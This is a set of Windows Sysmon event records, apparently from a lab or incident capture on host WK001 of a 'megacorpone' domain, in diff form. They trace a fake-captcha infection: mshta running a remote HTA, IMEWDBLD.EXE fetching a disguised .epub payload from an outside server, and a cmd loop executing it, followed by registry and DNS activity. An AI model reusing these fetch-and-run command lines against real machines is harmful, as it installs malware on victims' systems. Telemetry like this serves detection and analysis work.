+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Policies\Microsoft\SystemCertificates</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>12</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>12</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.3494802Z" /> 
+  <EventRecordID>692615</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="EventType">CreateKey</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.348</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Policies\Microsoft</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>12</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>12</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.3494646Z" /> 
+  <EventRecordID>692614</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="EventType">CreateKey</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.348</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software\Policies</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>12</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>12</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:59.3494450Z" /> 
+  <EventRecordID>692613</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="EventType">CreateKey</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:59.348</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetObject">HKU\S-1-5-21-1217547164-3920739005-1334084395-1103\Software</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>11</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>11</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:28.7794135Z" /> 
+  <EventRecordID>692600</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:28.777</Data> 
+  <Data Name="ProcessGuid">{8404bf77-2fd6-688b-3000-000000000c00}</Data> 
+  <Data Name="ProcessId">2536</Data> 
+  <Data Name="Image">C:\WINDOWS\system32\svchost.exe</Data> 
+  <Data Name="TargetFilename">C:\Windows\Prefetch\CAPTCHA_PRIVACY[1].EPUB-44387CB3.pf</Data> 
+  <Data Name="CreationUtcTime">2025-08-05 09:01:28.777</Data> 
+  <Data Name="User">NT AUTHORITY\SYSTEM</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>22</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>22</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:21.0687841Z" /> 
+  <EventRecordID>692598</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4944" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:05.373</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="QueryName">qqqqqqqqqqqqqqqq.org</Data> 
+  <Data Name="QueryStatus">9003</Data> 
+  <Data Name="QueryResults">-</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>1</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>1</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:18.6739263Z" /> 
+  <EventRecordID>692541</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:18.672</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0f37-000000000c00}</Data> 
+  <Data Name="ProcessId">19068</Data> 
+  <Data Name="Image">C:\Windows\System32\conhost.exe</Data> 
+  <Data Name="FileVersion">10.0.26100.4202 (WinBuild.160101.0800)</Data> 
+  <Data Name="Description">Console Window Host</Data> 
+  <Data Name="Product">Microsoft® Windows® Operating System</Data> 
+  <Data Name="Company">Microsoft Corporation</Data> 
+  <Data Name="OriginalFileName">CONHOST.EXE</Data> 
+  <Data Name="CommandLine">\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1</Data> 
+  <Data Name="CurrentDirectory">C:\WINDOWS</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="LogonGuid">{8404bf77-2fdf-688b-718a-080000000000}</Data> 
+  <Data Name="LogonId">0x88a71</Data> 
+  <Data Name="TerminalSessionId">1</Data> 
+  <Data Name="IntegrityLevel">Medium</Data> 
+  <Data Name="Hashes">SHA1=7357D28F791C37831135A8ACD9EAEB3356CBDD07,MD5=D4C588A47AF08B2BC335C8AB37C4B5E7,SHA256=2D8C0A3E77D6B7B0619EA8EE282CD5D73E2F6A79BF8B3339611AB8BB5E8704E4,IMPHASH=7E0C49E135633E325641729D15CD6CC7</Data> 
+  <Data Name="ParentProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ParentProcessId">17852</Data> 
+  <Data Name="ParentImage">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="ParentCommandLine">"C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub"</Data> 
+  <Data Name="ParentUser">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>1</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>1</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:18.6648988Z" /> 
+  <EventRecordID>692539</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:18.635</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="FileVersion">-</Data> 
+  <Data Name="Description">-</Data> 
+  <Data Name="Product">-</Data> 
+  <Data Name="Company">-</Data> 
+  <Data Name="OriginalFileName">-</Data> 
+  <Data Name="CommandLine">"C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub"</Data> 
+  <Data Name="CurrentDirectory">C:\Windows\System32\</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="LogonGuid">{8404bf77-2fdf-688b-718a-080000000000}</Data> 
+  <Data Name="LogonId">0x88a71</Data> 
+  <Data Name="TerminalSessionId">1</Data> 
+  <Data Name="IntegrityLevel">Medium</Data> 
+  <Data Name="Hashes">SHA1=0088671F4D025F08B3F600BDC3C8BEEAD1D89FF3,MD5=15B211B8D6C2760E4E9BB221D59A0355,SHA256=A88FEDC93A1D80C8CEA08FBCB6B001293DDF357E27D268B32C5CFD23A49E96ED,IMPHASH=D4E9F9D732B17B7FF9FE06A68EFA86E9</Data> 
+  <Data Name="ParentProcessGuid">{8404bf77-c85e-6891-0c37-000000000c00}</Data> 
+  <Data Name="ParentProcessId">3396</Data> 
+  <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data> 
+  <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe" /c for /r "C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache" %i in (*.epub) do (start "" "%i" & exit)</Data> 
+  <Data Name="ParentUser">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>11</EventID> 
+  <Version>2</Version> 
+  <Level>4</Level> 
+  <Task>11</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:16.4634115Z" /> 
+  <EventRecordID>692477</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:16.462</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85c-6891-0837-000000000c00}</Data> 
+  <Data Name="ProcessId">15956</Data> 
+  <Data Name="Image">C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE</Data> 
+  <Data Name="TargetFilename">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="CreationUtcTime">2025-08-05 09:01:16.462</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>1</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>1</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:01:16.4092700Z" /> 
+  <EventRecordID>692476</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:16.399</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85c-6891-0837-000000000c00}</Data> 
+  <Data Name="ProcessId">15956</Data> 
+  <Data Name="Image">C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE</Data> 
+  <Data Name="FileVersion">10.0.26100.3624 (WinBuild.160101.0800)</Data> 
+  <Data Name="Description">Microsoft IME Open Extended Dictionary Module</Data> 
+  <Data Name="Product">Microsoft® Windows® Operating System</Data> 
+  <Data Name="Company">Microsoft Corporation</Data> 
+  <Data Name="OriginalFileName">imewdbld.exe</Data> 
+  <Data Name="CommandLine">"C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE" http://news.axonbyte.org:8000/captcha_privacy.epub</Data> 
+  <Data Name="CurrentDirectory">C:\WINDOWS\System32\</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="LogonGuid">{8404bf77-2fdf-688b-718a-080000000000}</Data> 
+  <Data Name="LogonId">0x88a71</Data> 
+  <Data Name="TerminalSessionId">1</Data> 
+  <Data Name="IntegrityLevel">Medium</Data> 
+  <Data Name="Hashes">SHA1=116139F3E810C94E63DB1E87F33D4523FB8465E1,MD5=ED3D5A3A64B50479D722E4A10474E0AC,SHA256=9A9DE1F75FBF831C56B5A9A6608E22E5C518CEA0534FDB7FFD39E8B5AA2D95B1,IMPHASH=E52462BA6DE9C2A1D63372A5F062D715</Data> 
+  <Data Name="ParentProcessGuid">{8404bf77-c85c-6891-0737-000000000c00}</Data> 
+  <Data Name="ParentProcessId">19424</Data> 
+  <Data Name="ParentImage">C:\Windows\System32\mshta.exe</Data> 
+  <Data Name="ParentCommandLine">"C:\WINDOWS\System32\mshta.exe" http://pfusioncaptcha.com/13221442.hta</Data> 
+  <Data Name="ParentUser">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
